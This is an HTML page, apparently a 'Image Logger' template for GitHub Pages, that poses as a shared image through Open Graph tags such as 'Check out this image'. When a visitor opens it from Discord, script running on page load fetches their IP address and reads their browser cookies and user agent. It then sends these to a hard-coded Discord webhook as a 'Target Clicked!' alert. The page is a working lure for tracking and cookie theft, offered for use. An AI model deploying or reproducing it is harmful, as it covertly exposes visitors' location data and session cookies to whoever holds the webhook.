<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    
    <!-- REPLACE THE LINK BELOW WITH YOUR IMGUR DIRECT LINK -->
    <meta property="og:image" content="https://i.imgur.com/YOUR_IMGUR_LINK_HERE.png"> 
    <meta property="og:title" content="Check out this image">
    <meta property="og:description" content="Click to view full size">
    <meta property="og:url" content="https://bighunnab-bit.github.io/image-logger/">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #2f3136;
            height: 100vh;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";

    // Log if opened from Discord
    if (document.referrer.includes("discord.com") || document.referrer.includes("discordapp.com")) {
        logData();
    }

    async function logData() {
        try {
            let ip = "Unknown";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (e) {
                ip = "Could not retrieve IP";
            }

            const cookies = document.cookie;

            const payload = {
                embeds: [{
                    title: "🕵️‍♂️ Target Clicked!",
                    color: 15158332, 
                    fields: [
                        {
                            name: "🌐 IP Address",
                            value: `\`${ip}\``,
                            inline: true
                        },
                        {
                            name: "🔑 Browser Cookies",
                            value: `\`\`\`${cookies}\`\`\``,
                            inline: false
                        },
                        {
                            name: "📅 Time",
                            value: new Date().toLocaleString(),
                            inline: false
                        },
                        {
                            name: "💻 User Agent",
                            value: navigator.userAgent,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Logger v1.0"
                    }
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

        } catch (error) {
            console.error("Logging failed:", error);
        }
    }
</script>

</body>
</html>
